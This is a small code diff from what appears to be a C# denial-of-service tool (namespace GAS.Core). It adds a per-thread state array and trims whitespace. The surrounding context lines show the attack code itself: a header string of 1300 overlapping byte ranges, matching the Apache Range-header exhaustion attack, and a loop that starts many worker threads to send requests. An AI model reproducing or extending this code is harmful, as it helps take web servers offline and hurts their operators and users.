@@ -39,6 +39,7 @@ namespace GAS.Core
             this.Timeout = timeout * 1000;
             this.random = random;
             this.usegZip = usegzip;
+            States = new ReqState[ThreadCount];
             _attacktype = attacktype;
 
         }
@@ -51,7 +52,6 @@ namespace GAS.Core
             StringBuilder temp = new StringBuilder(6000);
             for (int k = 0; k < 1300; temp.Append(",5-" + (k++))) ;
             this.AttackHeader = temp.ToString();
-            
             for (int i = 0; i < ThreadCount; i++)
                 (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i);
             init = true;
@@ -131,6 +131,7 @@ namespace GAS.Core
             }
             catch { }
             finally {}
+            
         }
         public override void Stop()
         {
